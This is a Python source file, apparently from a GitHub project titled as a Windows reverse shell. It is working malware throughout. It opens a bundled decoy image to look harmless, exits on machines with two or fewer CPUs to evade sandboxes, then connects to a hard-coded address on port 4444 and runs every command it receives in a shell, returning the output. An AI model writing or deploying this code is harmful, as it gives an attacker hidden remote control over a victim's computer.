#https://github.com/TacticalCheerio/Python-Windows-Reverse-Shell/blob/master/reverse_shell.py

import os
import socket
import subprocess
import sys

bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
path_to_yml = os.path.abspath(os.path.join(bundle_dir, 'pirates.jpg'))

#f_name = sys._MEIPASS+"\file.docx"
subprocess.Popen(path_to_yml, shell=True)

if os.cpu_count() <= 2:
    quit()

HOST = '192.168.125.145'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[*] Connection Established!"))

while 1:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        if data == "quit": 
            break
        if data[:2] == "cd":
            os.chdir(data[3:])
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            stdout_value = proc.stdout.read() + proc.stderr.read()
            output_str = str(stdout_value, "UTF-8")
            s.send(str.encode("\n" + output_str))
    except Exception as e:
        continue
    
s.close()
